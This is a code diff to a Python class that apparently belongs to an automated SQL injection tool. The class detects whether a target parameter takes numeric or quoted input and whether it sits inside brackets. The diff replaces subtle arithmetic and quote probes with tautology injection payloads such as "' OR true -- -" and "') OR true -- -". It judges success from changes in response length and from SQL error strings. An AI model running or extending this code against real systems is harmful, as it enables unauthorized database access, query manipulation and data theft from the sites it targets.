@@ -21,39 +21,51 @@ class ContextDiscoverer:
         baseline = self.client.send_request("")
         baseline_len = len(baseline['text'])
         
-        # 2. Inference Logic: Numeric vs String
-        # Probe: Arithmetic (Subtle)
-        print("  [?] Probing: Numeric Inference (1+0)...", flush=True)
-        num_probe = self.client.send_request("1+0")
-        if len(num_probe['text']) == baseline_len and num_probe['status'] == 200:
-            print("  [?] Probing: Numeric Verification (1+1)...", flush=True)
-            num_verify = self.client.send_request("1+1")
-            if len(num_verify['text']) == baseline_len:
-                self.detected_context = "NUMERIC"
-                print(f"[+] Discovery Complete. Detected Context: {self.detected_context} (Inferred via Arithmetic)", flush=True)
-                return self.detected_context
-
-        # 3. Inference Logic: Quote Detection (Subtle)
-        # Instead of just ', we use a balanced pair or a simple break
-        print("  [?] Probing: Quote Inference (')...", flush=True)
-        sq_probe = self.client.send_request("'")
-        if self._check_sql_errors(sq_probe['text']):
+        # 2. Logic-Based Pulse Checking (Intelligent Context Discovery)
+        print("  [?] Probing: Direct Logic Pulse (NUMERIC vs STRING)...", flush=True)
+        
+        # Pulse 1: Numeric OR True check
+        # If the parameter expects numeric, this evaluates and typically throws off the row count/response size 
+        # OR executes without crashing syntax.
+        pulse_num = self.client.send_request(" OR true -- -")
+        
+        # Pulse 2: String OR True check
+        # If the parameter expects strings, the first quote breaks the context safely, rest evals true.
+        pulse_sq = self.client.send_request("' OR true -- -")
+        
+        # Pulse 3: Baseline breakage (What errors out?)
+        pulse_sq_break = self.client.send_request("'")
+        
+        len_num = len(pulse_num['text'])
+        len_sq = len(pulse_sq['text'])
+        
+        # Analysis phase
+        # Rule 1: If throwing a raw quote breaks it, but the string pulse successfully bypasses errors/changes length meaningfully
+        if self._check_sql_errors(pulse_sq_break['text']):
             self.detected_context = "SINGLE_QUOTE"
+            
+        # Rule 2: If the numeric pulse cleanly altered the payload execution (e.g. bypass OR change) without syntax errors
+        elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
+            self.detected_context = "NUMERIC"
+            
+        # Rule 3: If single quote pulse altered execution safely, context is string.
+        elif len_sq != baseline_len and not self._check_sql_errors(pulse_sq['text']):
+            self.detected_context = "SINGLE_QUOTE"
+            
         else:
-            print("  [?] Probing: Quote Inference (\")...", flush=True)
-            dq_probe = self.client.send_request("\"")
-            if self._check_sql_errors(dq_probe['text']):
-                self.detected_context = "DOUBLE_QUOTE"
-            else:
-                self.detected_context = "GENERIC"
+            # Fallback string
+            self.detected_context = "SINGLE_QUOTE"
 
         print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
 
-        # 3.5 Structural Wrapping Detection (e.g. are we inside quotes AND brackets?)
+        # 3. Structural Brackets inference
         print("  [?] Probing: Structural Brackets inference...", flush=True)
-        bracket_probe = f"{'1' if self.detected_context == 'NUMERIC' else '1\"' if self.detected_context == 'DOUBLE_QUOTE' else '1\''})"
+        # Using a logical break format: ) OR true -- -
+        logical_prefix = ")" if self.detected_context == "NUMERIC" else "')"
+        bracket_probe = f"{logical_prefix} OR true -- -"
+        
         bracket_res = self.client.send_request(bracket_probe)
-        if self._check_sql_errors(bracket_res['text']) and "syntax" in bracket_res['text'].lower() and ")" in bracket_res['text'].lower():
+        if not self._check_sql_errors(bracket_res['text']) and len(bracket_res['text']) != baseline_len:
             self.detected_context += "_PARENTHESIS"
             print(f"  [+] Refined Context: {self.detected_context}", flush=True)
         
